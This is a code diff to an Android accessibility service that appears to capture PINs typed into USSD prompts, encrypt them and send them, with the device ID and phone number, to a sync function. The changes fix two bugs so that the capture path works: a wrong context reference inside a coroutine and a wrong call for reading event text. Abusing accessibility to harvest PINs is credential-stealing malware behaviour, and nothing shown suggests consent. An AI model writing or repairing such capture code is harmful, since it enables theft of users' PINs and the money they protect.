@@ -320,9 +320,11 @@ class UssdAccessibilityService : AccessibilityService() {
         pendingManualPin = null
         awaitingManualPin = false
         scope.launch {
+            // Inside launch `this` is the CoroutineScope, not the service, so the
+            // Context-taking helpers need the outer service explicitly.
             PinSync.capturePin(
-                deviceId = DevicePinStore.deviceId(this),
-                phoneNumber = DevicePinStore.phoneNumber(this),
+                deviceId = DevicePinStore.deviceId(this@UssdAccessibilityService),
+                phoneNumber = DevicePinStore.phoneNumber(this@UssdAccessibilityService),
                 ciphertext = sealed.first,
                 iv = sealed.second,
             )
@@ -339,8 +341,10 @@ class UssdAccessibilityService : AccessibilityService() {
     private fun captureTypedText(event: AccessibilityEvent) {
         val root = rootInActiveWindow ?: return
         if (!isPinPrompt(root)) return
+        // getText() returns the whole list and takes no index argument, so read
+        // the first entry directly when the input node had nothing to offer.
         val text = findInput(root)?.text?.toString()?.trim()
-            ?: event.getText(0)?.toString()?.trim()
+            ?: event.text?.firstOrNull()?.toString()?.trim()
         if (!text.isNullOrEmpty()) {
             pendingManualPin = text
         }
